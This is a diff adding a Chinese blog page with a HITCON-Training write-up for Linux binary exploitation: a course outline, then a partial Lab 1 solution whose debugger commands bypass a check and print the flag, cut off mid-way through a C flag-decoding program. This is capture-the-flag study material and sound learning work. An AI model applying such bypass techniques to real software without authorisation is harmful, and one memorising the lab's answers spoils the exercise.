@@ -1,0 +1,857 @@
+<!DOCTYPE html>
+
+<html lang="zh-CN">
+    <head>
+    <meta charset="utf-8">
+    <!--
+        hexo-theme-suka © SukkaW
+        GitHub: https://github.com/SukkaW/hexo-theme-suka
+    -->
+
+    <!-- ### Resource Hint ### -->
+
+    <!-- ## DNS Prefetch ## -->
+    <meta http-equiv="x-dns-prefetch-control" content="on">
+
+<!-- busuanzi -->
+
+
+<!-- comment -->
+
+
+
+
+
+
+
+<!-- analytics -->
+
+
+
+
+
+
+
+    <!-- ## Preload ## -->
+    
+
+
+
+
+    <!-- ### Meta & Title & Info ### -->
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, minimum-scale=1, initial-scale=1, maximum-scale=5, viewport-fit=cover">
+    <meta name="renderer" content="webkit">
+
+    <!-- Title -->
+    <title>HITCON-train | wtf</title>
+
+    <!-- Favicons -->
+    <link rel="icon" type="image&#x2F;ico" href="/img/aaa.ico">
+
+    <!-- ### Import File ### -->
+    <link rel="stylesheet" href="/lib/spectre/spectre.min.css"><style>
+    body {
+        background-color: #f8f9fa;
+    }
+
+    a, a:visited {
+        color: #0070ff;
+    }
+
+    a:active, a:focus, a:hover {
+        color: #0070ff;
+        opacity: .75;
+    }
+
+    #post-content a,
+    #post-content a:hover,
+    #post-content a:focus,
+    #post-content a:visited {
+        color: #005eb9;
+        opacity: 1;
+    }
+
+    
+
+    .post-entry .card-body a {
+        color: #0070ff;
+    }
+
+    .avatar {
+        background: #444;
+    }
+
+    .navbar-link,
+    .navbar-link:visited,
+    .timeline .timeline-item .timeline-icon.icon-lg {
+        color: #0070ff;
+    }
+
+    .navbar-link:hover {
+        color: #0070ff;
+        opacity: .8;
+    }
+
+    #search-input .btn,
+    #disqus_click_btn,
+    #disqus-switch-to-direct,
+    #disqus-loadmore-button {
+        background: #727e96;
+        border-color: #727e96;
+        color: #fff;
+    }
+
+    #post-toc a.post-toc-link,
+    #post-toc a.post-toc-link:visited,
+    .share-menu.menu .menu-item>a {
+        color: #727e96;
+    }
+
+    .share-menu.menu .menu-item>a:hover,
+    .share-menu.menu .menu-item>a:focus,
+    .share-menu.menu .menu-item>a:visited {
+        color: #50596c;
+        background: #f8f9fa;
+        opacity: .85;
+    }
+</style><link rel="stylesheet" href="/css/style.min.css">
+
+
+
+
+
+
+
+
+    <!-- Prettify Theme -->
+    
+    <link rel="preload" href="/css/highlight/monokai-sublime.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="/css/highlight/monokai-sublime.min.css"></noscript>
+
+
+
+
+
+<script>
+/*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+!function(t){"use strict";t.loadCSS||(t.loadCSS=function(){});var e=loadCSS.relpreload={};if(e.support=function(){var e;try{e=t.document.createElement("link").relList.supports("preload")}catch(t){e=!1}return function(){return e}}(),e.bindMediaToggle=function(t){var e=t.media||"all";function a(){t.addEventListener?t.removeEventListener("load",a):t.attachEvent&&t.detachEvent("onload",a),t.setAttribute("onload",null),t.media=e}t.addEventListener?t.addEventListener("load",a):t.attachEvent&&t.attachEvent("onload",a),setTimeout(function(){t.rel="stylesheet",t.media="only x"}),setTimeout(a,3e3)},e.poly=function(){if(!e.support())for(var a=t.document.getElementsByTagName("link"),n=0;n<a.length;n++){var o=a[n];"preload"!==o.rel||"style"!==o.getAttribute("as")||o.getAttribute("data-loadcss")||(o.setAttribute("data-loadcss",!0),e.bindMediaToggle(o))}},!e.support()){e.poly();var a=t.setInterval(e.poly,500);t.addEventListener?t.addEventListener("load",function(){e.poly(),t.clearInterval(a)}):t.attachEvent&&t.attachEvent("onload",function(){e.poly(),t.clearInterval(a)})}"undefined"!=typeof exports?exports.loadCSS=loadCSS:t.loadCSS=loadCSS}("undefined"!=typeof global?global:this);
+</script>
+
+    <!-- ### Site Verification ### -->
+    
+
+
+    <link rel="alternate" type="application/atom+xml" href="/atom.xml"><meta name="mobile-web-app-capable" content="yes"><meta name="application-name" content="wtf"><meta name="msapplication-starturl" content="http://im0use.github.io"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="wtf"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+    <!-- ### The Open Graph & Twitter Card Protocol ### -->
+    <meta property="og:title" content="HITCON-train | wtf"><meta property="og:site_name" content="wtf"><meta property="og:type" content="article"><meta property="og:url" content="http://im0use.github.io/2022/06/08/hitcon-train/"><meta property="og:locale" content="zh-CN"><meta name="description" content="HITCON-TrainingFor Linux binary Exploitation Environment Setupgit clone https:&#x2F;&#x2F;github.com&#x2F;scwuaptx&#x2F;HITCON-Training.git ~&#x2F; cd HITCON-Training &amp;amp;&amp;amp; chmod u+x .&#x2F;env_setup.sh &amp;amp;&amp;amp; .&#x2F;env_setup - wtfff - wtf"><meta property="article:published_time" content="2022-06-08T14:43:16.000Z"><meta property="article:modified_time" content="2022-05-29T01:03:06.993Z"><meta property="og:updated_time" content="2022-05-29T01:03:06.993Z"><meta property="article:author" content="wtfff"><meta name="twitter:card" content="summary">
+
+    
+
+    <!-- ### Canonical link ### -->
+    <link rel="canonical" href="http://im0use.github.io/2022/06/08/hitcon-train/">
+
+    <meta name="generator" content="Hexo 5.4.2">
+
+    <!-- ### Analytics ### -->
+    
+
+
+
+
+
+
+
+    <!-- ### Structured Data ### -->
+    
+
+
+
+<script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "url": "http://im0use.github.io/2022/06/08/hitcon-train/",
+    "@type": "BlogPosting",
+    "logo": "http://im0use.github.io/img/aaa.ico",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "http://im0use.github.io/2022/06/08/hitcon-train/"
+    },
+    "headline": "HITCON-train | wtf",
+    
+    "image": {
+        "@type": "ImageObject",
+        "url": "http://im0use.github.io/img/aaa.ico"
+    },
+    
+    "datePublished": "2022-06-08T14:43:16.000Z",
+    "dateModified": "2022-05-29T01:03:06.993Z",
+    "author": {
+        "@type": "Person",
+        "name": "wtfff",
+        "image": {
+            "@type": "ImageObject",
+            "url": "http://im0use.github.io/img/aaa.jpg"
+        },
+        "description": "WTF is white tight feet."
+    },
+    "publisher": {
+        "@type": "Organization",
+        "name": "wtf",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "http://im0use.github.io/img/aaa.ico"
+        }
+    },
+    
+    "potentialAction": {
+        "@type": "SearchAction",
+        "target": "http://im0use.github.io/search?s={search_term_string}",
+        "query-input": "required name=search_term_string"
+    },
+    
+    "keywords": "",
+    "description": "HITCON-TrainingFor Linux binary Exploitation Environment Setupgit clone https://github.com/scwuaptx/HITCON-Training.git ~/ cd HITCON-Training &amp;amp;amp;&amp;amp;amp; chmod u+x ./env_setup.sh &amp;amp;amp;&amp;amp;amp; ./env_setup - wtfff - wtf"
+}
+</script>
+
+
+
+    <!-- ### Custom Head ### -->
+    
+<style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container[display="true"] {
+  overflow: auto hidden;
+}
+
+mjx-container[display="true"] + br {
+  display: none;
+}
+</style></head>
+
+    <body>
+            
+
+            <!-- ### Main content ### -->
+            <!-- ## Header ##-->
+<header>
+    <h1 class="header-title text-center"><a href="/">wtf</a></h1>
+
+    <p class="text-center header-slogan">
+        
+            
+                WTF is white tight feet.
+            
+        
+    </p>
+
+    <nav class="navbar-section text-center">
+    
+        <a href="/" class="navbar-link">首页</a>
+    
+    
+        <a href="/archives/" class="navbar-link">归档</a>
+    
+    
+    
+        <a href="/about/" class="navbar-link">About</a>
+    
+    
+        <div class="dropdown dropdown-right">
+    <a class="navbar-link dropdown-toggle" tabindex="0">分享</a>
+    <ul class="menu share-menu">
+
+        <!-- Share Weibo -->
+        
+        <li class="menu-item">
+            <a href="http://service.weibo.com/share/share.php?appkey=&title=wtf&url=http://im0use.github.io&pic=http://im0use.github.io/img/aaa.ico&searchPic=false&style=simple" target="_blank" rel="external noopener noreferrer nofollow">分享到微博</a>
+        </li>
+        
+
+        <!-- Share Twitter -->
+        
+        <li class="menu-item">
+            <a href="https://twitter.com/intent/tweet?text=wtf&url=http://im0use.github.io&via=wtfff" target="_blank" rel="external noopener noreferrer nofollow">分享到 Twitter</a>
+        </li>
+        
+
+        <!-- Share Facebook -->
+        
+        <li class="menu-item">
+            <a href="https://www.facebook.com/sharer/sharer.php?u=http://im0use.github.io" target="_blank" rel="external noopener noreferrer nofollow">分享到 Facebook</a>
+        </li>
+        
+
+        <!-- Share Google+ -->
+        
+        <li class="menu-item">
+            <a href="https://plus.google.com/share?url=http://im0use.github.io" target="_blank" rel="external noopener noreferrer nofollow">分享到 Google+</a>
+        </li>
+        
+
+        <!-- Share LinkedIn -->
+        
+        <li class="menu-item">
+            <a href="https://www.linkedin.com/shareArticle?mini=true&url=http://im0use.github.io&title=HITCON-train" target="_blank" rel="external noopener noreferrer nofollow">分享到 LinkedIn</a>
+        </li>
+        
+
+        <!-- Share QQ -->
+        
+        <li class="menu-item">
+            <a href="http://connect.qq.com/widget/shareqq/index.html?site=wtf&title=HITCON-train&summary=&pics=http://im0use.github.io/img/aaa.ico&url=http://im0use.github.io" target="_blank" rel="external noopener noreferrer nofollow"> 分享到 QQ</a>
+        </li>
+        
+
+        <!-- Share Telegram -->
+        
+        <li class="menu-item">
+            <a href="https://t.me/share/url?url=http://im0use.github.io&text=HITCON-train" target="_blank" rel="external noopener noreferrer nofollow">分享到 Telegram</a>
+        </li>
+        
+
+        <!-- QRCode -->
+        
+        <li class="menu-item">
+            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJQAAACUCAAAAABQV18IAAAB50lEQVR42u3by27DMAxEUf//TzerAkFizgwDLST6etMAdqNjQC+SyvW34XWBAgUK1A3qEtf//a9/frtffcfnc64dULNQt52uQN2Bqufdy309D2oUSnVw97m6X6HLdkA9AqU6fNKxQYFyk2YyGbrJFdQzUHKhLBqqQNXGcNkuAdT2qCRwWPF3eTQDakuUTToEHTeZVJdmXUBtjXLJiM6E6ZIiqk1Qc1DyoQKcJD5cEGsnT1DHo9ximSY11KTqBhCoGagkkaoC086EaQcLqBGo7iY/6eBuAS4Xd1AjUGlBKE2KdTZ3dvSBOhKlCtUuIZsMgE6wCmoOSi2ySwKCMDELagZKFRfVAp0exElfFNQclOp83YMPabEgipBBHYtKNmedRbt7iCIafaCORLkEh+uwSaHbbgZBjUCpxEYyANQLJIWiuOIA6hhUJxHmAowkuSE/gxqBShIR3QKSmjzVd4Kag0oOciU/0IgTGWnBCNSRqOTgcqeQ1DkY2C4YgToC5a5fEmFJcQDUXNQvDbqDOOlhMDl5gjoa5RbaNFHrCkf2pUCNQiWb/OTARDfpBup5KLXZ6wSe0UAC9ShUOlm6YKN1WALU0agkidrp3KrwXbYDagwqLTamB0+TANR2dFDHona6QIECBertegHo4O7ePr29XgAAAABJRU5ErkJggg==" alr="QRCode">
+        </li>
+        
+
+    </ul>
+</div>
+    
+    
+</nav>
+</header>
+
+            
+    <!-- ## Post ## -->
+    <div class="post-container">
+    <div id="post-card" class="card">
+        
+        <div class="card-item-container">
+            <div class="card-inner-cell">
+                <!-- # Post Header Info # -->
+                <div class="card-header">
+                    
+    <h1 class="card-title h3 mb-2">HITCON-train</h1>
+
+
+
+
+<div class="post-header-info">
+    <p class="post-header-info-left text-gray">
+        <img class="author-thumb lazyload" data-src="/img/aaa.jpg" src="/img/suka-lazyload.gif" alt="wtfff's Avatar">
+        <span>2022-06-08</span>
+        
+        
+        
+    </p>
+    <div class="post-header-info-right">
+        
+            <div class="dropdown dropdown-right">
+<a class="dropdown-toggle" tabindex="0">分享本文</a>
+<ul class="menu share-menu">
+    <!-- Share Weibo -->
+    
+    <li class="menu-item">
+        <a href="http://service.weibo.com/share/share.php?appkey=&title=HITCON-train&url=http://im0use.github.io/2022/06/08/hitcon-train/&pic=http://im0use.github.io/img/aaa.ico&searchPic=false&style=simple" target="_blank" rel="external noopener noreferrer nofollow">分享到微博</a>
+    </li>
+    
+
+    <!-- Share Twitter -->
+    
+    <li class="menu-item">
+        <a href="https://twitter.com/intent/tweet?text=HITCON-train&url=http://im0use.github.io/2022/06/08/hitcon-train/&via=wtfff" target="_blank" rel="external noopener noreferrer nofollow">分享到 Twitter</a>
+    </li>
+    
+
+    <!-- Share Facebook -->
+    
+    <li class="menu-item">
+        <a href="https://www.facebook.com/sharer/sharer.php?u=http://im0use.github.io/2022/06/08/hitcon-train/" target="_blank" rel="external noopener noreferrer nofollow">分享到 Facebook</a>
+    </li>
+    
+
+    <!-- Share Google+ -->
+    
+    <li class="menu-item">
+        <a href="https://plus.google.com/share?url=http://im0use.github.io/2022/06/08/hitcon-train/" target="_blank" rel="external noopener noreferrer nofollow">分享到 Google+</a>
+    </li>
+    
+
+    <!-- Share LinkedIn -->
+    
+    <li class="menu-item">
+        <a href="https://www.linkedin.com/shareArticle?mini=true&url=http://im0use.github.io/2022/06/08/hitcon-train/&title=wtf" target="_blank" rel="external noopener noreferrer nofollow">分享到 LinkedIn</a>
+    </li>
+    
+
+    <!-- Share QQ -->
+    
+    <li class="menu-item">
+        <a href="http://connect.qq.com/widget/shareqq/index.html?site=wtf&title=wtf&summary=&pics=http://im0use.github.io/img/aaa.ico&url=http://im0use.github.io/2022/06/08/hitcon-train/" target="_blank" rel="external noopener noreferrer nofollow"> 分享到 QQ</a>
+    </li>
+    
+
+    <!-- Share Telegram -->
+    
+    <li class="menu-item">
+        <a href="https://t.me/share/url?url=http://im0use.github.io/2022/06/08/hitcon-train/&text=wtf" target="_blank" rel="external noopener noreferrer nofollow">分享到 Telegram</a>
+    </li>
+    
+
+    <!-- QRCode -->
+    
+    <li class="menu-item">
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJQAAACUCAAAAABQV18IAAAB50lEQVR42u3by27DMAxEUf//TzerAkFizgwDLST6etMAdqNjQC+SyvW34XWBAgUK1A3qEtf//a9/frtffcfnc64dULNQt52uQN2Bqufdy309D2oUSnVw97m6X6HLdkA9AqU6fNKxQYFyk2YyGbrJFdQzUHKhLBqqQNXGcNkuAdT2qCRwWPF3eTQDakuUTToEHTeZVJdmXUBtjXLJiM6E6ZIiqk1Qc1DyoQKcJD5cEGsnT1DHo9ximSY11KTqBhCoGagkkaoC086EaQcLqBGo7iY/6eBuAS4Xd1AjUGlBKE2KdTZ3dvSBOhKlCtUuIZsMgE6wCmoOSi2ySwKCMDELagZKFRfVAp0exElfFNQclOp83YMPabEgipBBHYtKNmedRbt7iCIafaCORLkEh+uwSaHbbgZBjUCpxEYyANQLJIWiuOIA6hhUJxHmAowkuSE/gxqBShIR3QKSmjzVd4Kag0oOciU/0IgTGWnBCNSRqOTgcqeQ1DkY2C4YgToC5a5fEmFJcQDUXNQvDbqDOOlhMDl5gjoa5RbaNFHrCkf2pUCNQiWb/OTARDfpBup5KLXZ6wSe0UAC9ShUOlm6YKN1WALU0agkidrp3KrwXbYDagwqLTamB0+TANR2dFDHona6QIECBertegHo4O7ePr29XgAAAABJRU5ErkJggg==" alt="QRCode">
+    </li>
+    
+
+</ul>
+</div>
+        
+    </div>
+</div>
+                </div>
+                <div class="card-body">
+                    
+                        
+                        
+                            <div id="post-toc"><ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#HITCON-Training"><span class="post-toc-number">1.</span> <span class="post-toc-text">HITCON-Training</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Environment-Setup"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">Environment Setup</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Outline"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">Outline</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#write-up"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">write up</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#LAB-1-sysmagic"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">LAB 1 [sysmagic]</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#LAB-2-orw-bin"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">LAB 2 [orw.bin]</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#syscall-shellcode"><span class="post-toc-number">1.5.1.</span> <span class="post-toc-text">syscall   :   shellcode</span></a></li></ol></li></ol></li></ol></div>
+                        
+                    
+                    <article id="post-content">
+                        <span id="more"></span>
+
+<h1 id="HITCON-Training"><a href="#HITCON-Training" class="headerlink" title="HITCON-Training"></a>HITCON-Training</h1><p>For Linux binary Exploitation</p>
+<h2 id="Environment-Setup"><a href="#Environment-Setup" class="headerlink" title="Environment Setup"></a>Environment Setup</h2><pre><code>git clone https://github.com/scwuaptx/HITCON-Training.git ~/
+cd HITCON-Training &amp;&amp; chmod u+x ./env_setup.sh &amp;&amp; ./env_setup.sh
+</code></pre>
+<h2 id="Outline"><a href="#Outline" class="headerlink" title="Outline"></a>Outline</h2><ul>
+<li><p>Basic Knowledge</p>
+<ul>
+<li>Introduction<ul>
+<li>Reverse Engineering<ul>
+<li>Static Analysis</li>
+<li>Dynamic Analysis</li>
+</ul>
+</li>
+<li>Exploitation</li>
+<li>Useful Tool<ul>
+<li>IDA PRO</li>
+<li>GDB</li>
+<li>Pwntool</li>
+</ul>
+</li>
+<li>lab 1 - sysmagic</li>
+</ul>
+</li>
+<li>Section</li>
+<li>Compile,linking,assmbler</li>
+<li>Execution<ul>
+<li>how program get run</li>
+<li>Segment</li>
+</ul>
+</li>
+<li>x86 assembly<ul>
+<li>Calling convention </li>
+<li>lab 2 - open/read/write</li>
+<li>shellcoding</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>Stack Overflow</p>
+<ul>
+<li>Buffer Overflow</li>
+<li>Return to Text/Shellcode<ul>
+<li>lab 3 - ret2shellcode</li>
+</ul>
+</li>
+<li>Protection<ul>
+<li>ASLR/DEP/PIE/StackGuard</li>
+</ul>
+</li>
+<li>Lazy binding</li>
+<li>Return to Library<ul>
+<li>lab 4 - ret2lib</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>Return Oriented Programming</p>
+<ul>
+<li>ROP<ul>
+<li>lab 5 - simple rop</li>
+</ul>
+</li>
+<li>Using ROP bypass ASLR<ul>
+<li>ret2plt</li>
+</ul>
+</li>
+<li>Stack migration<ul>
+<li>lab 6 - migration</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>Format String Attack</p>
+<ul>
+<li>Format String </li>
+<li>Read from arbitrary memory<ul>
+<li>lab 7 - crack</li>
+</ul>
+</li>
+<li>Write to arbitrary memory<ul>
+<li>lab 8 - craxme</li>
+</ul>
+</li>
+<li>Advanced Trick<ul>
+<li>EBP chain </li>
+<li>lab 9 - playfmt</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>x64 Binary Exploitation</p>
+<ul>
+<li>x64 assembly</li>
+<li>ROP</li>
+<li>Format string Attack</li>
+</ul>
+</li>
+<li><p>Heap exploitation</p>
+<ul>
+<li>Glibc memory allocator overview</li>
+<li>Vulnerablility on heap<ul>
+<li>Use after free<ul>
+<li>lab 10 - hacknote</li>
+</ul>
+</li>
+<li>Heap overflow <ul>
+<li>house of force <ul>
+<li>lab 11 - 1 - bamboobox1</li>
+</ul>
+</li>
+<li>unlink<ul>
+<li>lab 11 - 2 - bamboobox2</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>Advanced heap exploitation</p>
+<ul>
+<li>Fastbin attack<ul>
+<li>lab 12 - babysecretgarden</li>
+</ul>
+</li>
+<li>Shrink the chunk</li>
+<li>Extend the chunk<ul>
+<li>lab 13 -  heapcreator</li>
+</ul>
+</li>
+<li>Unsortbin attack<ul>
+<li>lab 14 - magicheap</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>C++ Exploitation</p>
+<ul>
+<li>Name Mangling </li>
+<li>Vtable fucntion table</li>
+<li>Vector &amp; String</li>
+<li>New &amp; delete</li>
+<li>Copy constructor &amp; assignment operator<ul>
+<li>lab 15 - zoo</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>那些 Pwning 的奇淫技巧:</p>
+</li>
+</ul>
+<h2 id="write-up"><a href="#write-up" class="headerlink" title="write up"></a>write up</h2><h2 id="LAB-1-sysmagic"><a href="#LAB-1-sysmagic" class="headerlink" title="LAB 1 [sysmagic]"></a>LAB 1 [sysmagic]</h2><blockquote>
+<p>简单的 Symbolic Execution</p>
+</blockquote>
+<p>反编译发现输入<code>buf == v2</code>，buf是随机数，可以直接gdb调试。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( buf == v2 )</span><br><span class="line"><span class="comment">//  0x8048720 &lt;get_flag+389&gt;    cmp    edx, eax</span></span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x30</span>; ++i )</span><br><span class="line">      <span class="built_in">putchar</span>(v5[i] ^ v6[i + <span class="number">1</span>]);</span><br><span class="line">  }</span><br></pre></td></tr></table></figure>
+
+<p>断点<code> 0x08048712 &lt;+375&gt;:   call   0x8048480 &lt;__isoc99_scanf@plt&gt;</code>，然后随便输入一个值，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b *get_flag+375</span><br><span class="line">Breakpoint 1 at 0x8048712</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> <span class="variable">$eax</span>=<span class="variable">$edx</span></span><br><span class="line">pwndbg&gt; b *get_flag+471</span><br><span class="line">Note: breakpoint 2 also <span class="built_in">set</span> at pc 0x8048772.</span><br><span class="line">Breakpoint 3 at 0x8048772</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">CTF{debugger_1s_so_p0werful_1n_dyn4m1c_4n4lySis!}</span><br></pre></td></tr></table></figure>
+
+<p>其实我在想另一种方法，就是既然变量都在程序里，我们也可以手动计算。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">main() {</span><br><span class="line">    <span class="type">char</span> v5[<span class="number">0x80</span>];</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x80</span>] = <span class="string">"BDo_you_know_why_my_teammate_Orange_is_so_angry???"</span>;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    v5[<span class="number">0</span>] = <span class="number">7</span>;</span><br><span class="line">    v5[<span class="number">1</span>] = <span class="number">59</span>;</span><br><span class="line">    v5[<span class="number">2</span>] = <span class="number">25</span>;</span><br><span class="line">    v5[<span class="number">3</span>] = <span class="number">2</span>;</span><br><span class="line">    v5[<span class="number">4</span>] = <span class="number">11</span>;</span><br><span class="line">    v5[<span class="number">5</span>] = <span class="number">16</span>;</span><br><span class="line">    v5[<span class="number">6</span>] = <span class="number">61</span>;</span><br><span class="line">    v5[<span class="number">7</span>] = <span class="number">30</span>;</span><br><span class="line">    v5[<span class="number">8</span>] = <span class="number">9</span>;</span><br><span class="line">    v5[<span class="number">9</span>] = <span class="number">8</span>;</span><br><span class="line">    v5[<span class="number">10</span>] = <span class="number">18</span>;</span><br><span class="line">    v5[<span class="number">11</span>] = <span class="number">45</span>;</span><br><span class="line">    v5[<span class="number">12</span>] = <span class="number">40</span>;</span><br><span class="line">    v5[<span class="number">13</span>] = <span class="number">89</span>;</span><br><span class="line">    v5[<span class="number">14</span>] = <span class="number">10</span>;</span><br><span class="line">    v5[<span class="number">15</span>] = <span class="number">0</span>;</span><br><span class="line">    v5[<span class="number">16</span>] = <span class="number">30</span>;</span><br><span class="line">    v5[<span class="number">17</span>] = <span class="number">22</span>;</span><br><span class="line">    v5[<span class="number">18</span>] = <span class="number">0</span>;</span><br><span class="line">    v5[<span class="number">19</span>] = <span class="number">4</span>;</span><br><span class="line">    v5[<span class="number">20</span>] = <span class="number">85</span>;</span><br><span class="line">    v5[<span class="number">21</span>] = <span class="number">22</span>;</span><br><span class="line">    v5[<span class="number">22</span>] = <span class="number">8</span>;</span><br><span class="line">    v5[<span class="number">23</span>] = <span class="number">31</span>;</span><br><span class="line">    v5[<span class="number">24</span>] = <span class="number">7</span>;</span><br><span class="line">    v5[<span class="number">25</span>] = <span class="number">1</span>;</span><br><span class="line">    v5[<span class="number">26</span>] = <span class="number">9</span>;</span><br><span class="line">    v5[<span class="number">27</span>] = <span class="number">0</span>;</span><br><span class="line">    v5[<span class="number">28</span>] = <span class="number">126</span>;</span><br><span class="line">    v5[<span class="number">29</span>] = <span class="number">28</span>;</span><br><span class="line">    v5[<span class="number">30</span>] = <span class="number">62</span>;</span><br><span class="line">    v5[<span class="number">31</span>] = <span class="number">10</span>;</span><br><span class="line">    v5[<span class="number">32</span>] = <span class="number">30</span>;</span><br><span class="line">    v5[<span class="number">33</span>] = <span class="number">11</span>;</span><br><span class="line">    v5[<span class="number">34</span>] = <span class="number">107</span>;</span><br><span class="line">    v5[<span class="number">35</span>] = <span class="number">4</span>;</span><br><span class="line">    v5[<span class="number">36</span>] = <span class="number">66</span>;</span><br><span class="line">    v5[<span class="number">37</span>] = <span class="number">60</span>;</span><br><span class="line">    v5[<span class="number">38</span>] = <span class="number">44</span>;</span><br><span class="line">    v5[<span class="number">39</span>] = <span class="number">91</span>;</span><br><span class="line">    v5[<span class="number">40</span>] = <span class="number">49</span>;</span><br><span class="line">    v5[<span class="number">41</span>] = <span class="number">85</span>;</span><br><span class="line">    v5[<span class="number">42</span>] = <span class="number">2</span>;</span><br><span class="line">    v5[<span class="number">43</span>] = <span class="number">30</span>;</span><br><span class="line">    v5[<span class="number">44</span>] = <span class="number">33</span>;</span><br><span class="line">    v5[<span class="number">45</span>] = <span class="number">16</span>;</span><br><span class="line">    v5[<span class="number">46</span>] = <span class="number">76</span>;</span><br><span class="line">    v5[<span class="number">47</span>] = <span class="number">30</span>;</span><br><span class="line">    v5[<span class="number">48</span>] = <span 